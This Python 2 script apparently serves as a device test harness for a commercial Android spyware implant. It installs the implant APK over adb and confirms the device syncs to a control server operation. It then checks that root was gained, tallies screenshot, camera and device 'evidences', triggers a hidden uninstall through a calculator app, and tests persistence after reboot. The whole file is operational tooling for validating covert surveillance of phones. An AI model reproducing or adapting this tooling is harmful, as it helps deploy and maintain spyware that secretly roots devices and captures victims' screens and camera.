# -*- coding: utf-8 -*-

import sys, time
import csv
import os
import inspect
import traceback
import collections
import datetime

import adb

import package
from AVAgent import build

apk = 'assets/installer.default.apk'
service = 'com.android.dvci'

#set timeout via adb: http://osdir.com/ml/android-porting/2011-08/msg00182.html

def test_device(device_id, dev, results):

    # uninstall device
    adb.uninstall(service, dev)

    # install
    if not adb.install(apk, dev):
        return "installation failed"

    results["installed"] = True
    print "installation: OK"
    #exeec

    with build.connection() as c:
        operation = "Rite_Mobile"
        target_name = "HardwareFunctional"

        # logging into server
        assert c
        if not c.logged_in():
            return("Not logged in")
        else:
            print "logged in %s: OK" % c.host

        operation_id, group_id = c.operation(operation)
        target_id = c.targets(operation_id, target_name)[0]
        #print "target_id: %s" % target_id

        #delete proper instance
        instances = []
        instances = c.instances_by_deviceid(device_id, operation_id)
        assert len(instances) <= 1;
        for i in instances:
            c.instance_delete(i["_id"])
        time.sleep(5)
        instances = c.instances_by_deviceid(device_id, operation_id)
        assert not instances

        if not adb.executeGui(service, dev):
            return "execution failed"
        else:
            results["executed"] = True;
            print "executed: OK"

        #check for running
        time.sleep(10)
        processes = adb.ps(dev)
        running = service in processes
        assert running

        # sync e verifica
        print "... sleeping for sync"
        time.sleep(60)
        while not instances:
            #print "operation: %s, %s" % (operation_id, group_id)
            instances = c.instances_by_deviceid(device_id, operation_id)
            if not instances:
                print "... waiting for sync"
                time.sleep(10)

        assert len(instances) == 1
        instance_id = instances[0]['_id']
        #print "instance_id: %s " % instance_id
        print "sync: OK"

        # rename instance
        info = c.instance_info(instance_id)
        c.instance_rename(instance_id, info['name'] + " " + results['device'])
        info = c.instance_info(instance_id)
        results['instance_name'] =  info['name']
        print "instance name: %s" % info['name']

        # check for root
        info_evidences = []
        counter = 0
        while not info_evidences and counter < 10:
            infos =  c.infos( target_id, instance_id)
            info_evidences = [ e['data']['content'] for e in infos if 'Root' in e['data']['content'] ]
            counter +=1
            if not info_evidences:
                print "... waiting for info"
                time.sleep(10)

        #print "info_evidences: %s: " % info_evidences
        if not info_evidences:
            results['root'] = 'No'
            return "No root"
        else:
            print "root: OK"

        results['info'] = len(info_evidences) > 0
        root_method = info_evidences[0]
        results['root'] = root_method

        roots = [ r for r in info_evidences if 'previous' not in r ]
        #print "roots: %s " % roots
        assert len(roots) == 1

        # evidences
        evidences =  c.evidences( target_id, instance_id )
        device_evidences = [ e['data']['content'] for e in evidences if e['type']=='device' ]
        screenshot_evidences = [ e for e in evidences if e['type']=='screenshot' ]
        camera_evidences = [ e for e in evidences if e['type']=='camera' ]

        print "Evidences: dev %s, screen %s, cam %s" % (len(device_evidences), len(screenshot_evidences), len(camera_evidences))

        type_evidences = set()
        for e in evidences:
               type_evidences.add(e['type'])
        print type_evidences

        results['evidences'] = type_evidences

    #uninstall
    print "uninstall"
    calc = adb.execute("pm list packages calc").split()[0].split(":")[1]
    print "executing calc: %s" % calc
    adb.executeGui(calc, dev)
    time.sleep(20)

    processes = adb.ps(dev)
    uninstall = service not in processes
    results['uninstall'] = uninstall

    if not uninstall:
        print "uninstall: ERROR"
        adb.uninstall(service, dev)
    else:
        print "uninstall: OK"

    print "reboot"
    adb.reboot(dev)
    time.sleep(120)

    processes = adb.ps(dev)
    running = "persistence: %s" % service in processes
    results['running'] = running

    return True

def do_test(dev = None):
    build.connection.host = "rcs-castore"
    device_id = adb.get_deviceid(dev)
    #print "device_id: %s" % device_id

    assert device_id
    assert len(device_id) >= 8

    with open('tmp/test-%s.csv' % device_id, 'wb') as csvfile:
        # write header
        devicelist = csv.writer(csvfile, delimiter=";",
                                quotechar="|", quoting=csv.QUOTE_MINIMAL)

        # getprop device
        props = adb.get_properties(dev)
        device = "%s %s" % (props["manufacturer"], props["model"])

        results = collections.OrderedDict()
        results['time'] = "%s" % datetime.datetime.now()
        results['device'] = device
        results['id'] = device_id
        results['release'] =  props["release"]
        results['selinux'] =props["selinux"]
        results['error'] = ""
        results["return"] = ""
        try:
            ret = test_device(device_id, dev, results)
            results["return"] = ret
            print "return: %s " % ret
        except Exception, ex:
            traceback.print_exc(device_id)
            results['error'] = "%s" % ex

        print results

        #devicelist.writerow(results.keys())
        devicelist.writerow(results.values())

def main():
    devices = adb.get_attached_devices()

    print """ prerequisiti:
    1) Telefono connesso in USB,
    2) USB Debugging enabled (settings/developer options/usb debugging)
    3) connesso wifi a RSSM
    4) screen time 2m (settings/display/sleep)
    """

    print "devices connessi:"
    for device in devices:
        print device

    dev = None
    if not devices:
        print "non ci sono device connessi"
    else:

        if len(devices) > 1:
            dev = raw_input("su quale device si vuole eseguire il test? ")
            print "eseguo il test su %s" % dev

        do_test(dev)

    print "Fine."

if __name__ == "__main__":
    main()